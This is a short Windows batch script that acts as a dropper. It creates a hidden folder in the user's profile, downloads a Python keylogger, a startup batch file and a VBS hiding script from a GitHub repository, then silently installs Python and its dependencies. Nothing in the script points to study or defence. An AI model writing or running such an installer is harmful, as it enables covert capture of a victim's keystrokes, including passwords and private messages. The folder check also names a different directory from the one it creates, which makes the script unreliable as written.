@echo off
if not exist "%UserProfile%\.keylogger" mkdir "%UserProfile%\.keylog"
cd %UserProfile%\.keylog
curl "https://github.com/Raikster/keylogger_python/blob/main/keylogger.py" --output keylogger.py
curl "https://github.com/Raikster/keylogger_python/keylogger_start.bat" --output keylogger_start.bat
curl "https://github.com/Raikster/keylogger_python/testhide.vbs" --output testhide.vbs
curl "https://github.com/Raikster/keylogger_python/requirements.txt" --output requirements.txt
curl "https://www.python.org/ftp/python/3.9.6/python-3.9.6-amd64.exe" --output python396.exe
start /wait python396.exe /quiet InstallAllUsers=0 Include_launcher=0 Include_pip=1 Include_test=0 SimpleInstall=1
pip install -r requirements.txt
